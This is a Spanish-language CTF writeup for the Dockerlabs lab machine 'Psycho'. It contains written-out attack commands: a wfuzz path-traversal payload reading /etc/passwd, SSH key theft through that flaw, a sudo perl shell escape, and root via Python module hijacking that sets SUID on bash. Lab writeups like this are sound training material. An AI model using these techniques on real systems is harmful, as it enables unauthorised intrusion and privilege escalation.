@@ -1,0 +1,158 @@
+---
+layout: post
+title: Psycho
+subtitle: Plataforma Dockerlabs Dificultad Fácil
+cover-img: /assets/img/Psycho.png
+thumbnail-img: /assets/img/Psycho.png
+share-img: /assets/img/Psycho.png
+author: Elmili72
+---
+
+## 1. Escaneo general de puertos
+
+El primer paso como siempre será realizar un escaneo general de los puertos en la máquina.
+
+```bash
+sudo nmap -sS -p- --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
+```
+
+```bash
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+```
+
+## 2. Escaneo específico de puertos
+
+Conociendo los puertos abiertos, ahora habría que realizar un escaneo específicos de esos puertos para conocer que servicios y en que versión corren esos puertos.
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN target
+```
+
+```bash
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
+|_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: 4You
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+```
+
+Vemos que tenemos los puertos 22 y 80.
+## 3. Reconocimiento de servicio web
+
+A la hora de hacer reconocimiento web, a mi me gusta utilizar la herramienta *WHATWEB* para conocer las teconologías que corren en el puerto 80.
+
+```bash
+whatweb http://172.17.0.2                                                                                                                     
+http://172.17.0.2 [200 OK] Apache[2.4.58], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Script, Title[4You]
+```
+
+Una vez hemos visto lo que usa entramos en la página para ver lo que hay. Vemos botones de login y demás que no tienen ningún tipo de función.
+
+![[Pasted image 20250517181119.png]]
+
+Si bajamos del todo en la página aparece muy pequeño un mensaje de error.
+
+![[Pasted image 20250517181136.png]]
+
+Podemos intuir que al ser una extensión *PHP* está intentando realizar una llamada  aun archivo del sistema que no llegar a alcanzar. Por lo que realizamos un escaneo con *WFUZZ* para reconocer el parámetro al cual tiene que llamar para cargar ese error. Además, de añadir un destino que podría sernos interesante para que ese parámetro nos refleje información si fuera el caso.
+
+## 4. Escaneo de servicio web
+
+Una vez ya hemos visto el contenido de la página toca escanear el interior de esta, usando *GOBUSTER* no nos aparece nada que sea realmente útil. Así que atendiendo a lo anteriormente dicho procedemos a realizar Fuzzing para ver si hemos acertado con la teoría.
+
+```bash
+wfuzz -c --hc 404 --hw 169 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://172.17.0.2/index.php?FUZZ=../../../../../etc/passwd
+```
+
+Efectivamente, aparece un parámetro llamado *secret*, con el cual podemos hacer cositas.
+
+![[Pasted image 20250517181653.png]]
+
+Lo primero será mirar que usuarios tenemos y por los que podemos intentar una intrusión.
+
+![[Pasted image 20250517181732.png]]
+![[Pasted image 20250517181744.png]]![[Pasted image 20250517181959.png]]
+
+## 5. Intrusión
+
+Realizamos un intento de fuerza bruta con **HYDRA** pero no nos saca nada, por lo que vamos a aprovechar el parámetro de la web para intentar lograr alguna **ID_RSA** de los usuarios.
+
+![[Pasted image 20250517182327.png]]
+
+**IMPORTANTE**
+```bash
+chmod 600 id_rsa
+```
+
+![[Pasted image 20250517182502.png]]
+
+Y estamos dentro del usuario *Vaxei*
+## 6. Pivoting
+
+El usuario actual lamentablemente no nos da la posibilidad de realizar una escalada de privilegios directa, por lo que tendremos que realizar pivoting para saltar al usuario Luisillo y comprobar si nos da ese permiso.
+
+```bash
+vaxei@8a3056fa86ef:~$ sudo -l
+Matching Defaults entries for vaxei on 8a3056fa86ef:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User vaxei may run the following commands on 8a3056fa86ef:
+    (luisillo) NOPASSWD: /usr/bin/perl
+```
+
+Vemos que el binario *perl* puede ser explotado para el pivoting por lo que tiramos de nuestro fiel amigo *GTFOBins* y nos convertimos en el usuario Luisillo.
+
+```bash
+sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
+script /dev/null -c bash
+stty raw -echo; fg
+Ctrl + Z
+reset XTERM
+
+luisillo@8a3056fa86ef:/home/vaxei$ whoami
+luisillo
+```
+
+## 7. Escalada de privilegios
+
+Ahora el paso más bonito de un CTF, convertirnos en *ROOT*.
+
+```bash
+luisillo@8a3056fa86ef:/home/vaxei$ sudo -l
+Matching Defaults entries for luisillo on 8a3056fa86ef:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User luisillo may run the following commands on 8a3056fa86ef:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
+```
+
+De primeras ya vemos un script llamado *paw.py* que ejecuta un script que hace una llamada a un módulo que parece que no existe, por lo que como buenas personas que somos vamos a entregarle ese proceso que tanto busca :).
+
+![[Pasted image 20250517182944.png]]
+
+Creamos un script que se llame igual que pide el script anterior, en este caso *subprocess.py*. Y escribirmos lo siguiente:
+
+![[Pasted image 20250517183114.png]]
+![[Pasted image 20250517183158.png]]
+
+Podemos ver en la imagen anterior que la bash no tiene permisos SUID, pero nosotros vamos a corregir eso con nuestro suprocess.py.
+
+![[Pasted image 20250517183209.png]]
+![[Pasted image 20250517183233.png]]
+
+Tras ejecutar el script vemos que le hemos dado ese privilegio a la bash para poder ejecutar una bash privilegiada desde el usuario Luisillo.
+
+```bash
+luisillo@8a3056fa86ef:/opt$ bash -p
+bash-5.2# whoami
+root
+```
+
+Espero que os haya gustado y que os haya sido de ayuda este writeup, nos vemos en el próximo!
